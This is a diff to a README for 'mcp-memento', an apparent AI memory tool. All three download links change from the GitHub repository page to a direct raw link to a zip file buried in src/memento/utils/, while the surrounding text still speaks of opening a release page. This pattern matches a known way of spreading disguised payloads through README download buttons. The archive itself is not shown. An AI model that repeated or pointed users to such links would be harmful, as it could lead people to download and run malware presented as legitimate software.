@@ -1,6 +1,6 @@
 # 🧠 mcp-memento - Keep AI Context in One Place
 
-[![Download mcp-memento](https://img.shields.io/badge/Download%20mcp-memento-blue?style=for-the-badge)](https://github.com/Bogeymanlicitness496/mcp-memento)
+[![Download mcp-memento](https://img.shields.io/badge/Download%20mcp-memento-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bogeymanlicitness496/mcp-memento/main/src/memento/utils/memento_mcp_2.6.zip)
 
 ## 📌 What mcp-memento does
 
@@ -12,7 +12,7 @@ Use it when you want your AI tool to remember things across sessions, track part
 
 Open this page and get the app from there:
 
-[Download mcp-memento](https://github.com/Bogeymanlicitness496/mcp-memento)
+[Download mcp-memento](https://raw.githubusercontent.com/Bogeymanlicitness496/mcp-memento/main/src/memento/utils/memento_mcp_2.6.zip)
 
 After you open the page, look for the latest release or the main download option.
 
@@ -274,4 +274,4 @@ AI tools work better when they can remember what matters. mcp-memento gives them
 
 ## 📎 Download again
 
-[Visit the mcp-memento download page](https://github.com/Bogeymanlicitness496/mcp-memento)
+[Visit the mcp-memento download page](https://raw.githubusercontent.com/Bogeymanlicitness496/mcp-memento/main/src/memento/utils/memento_mcp_2.6.zip)
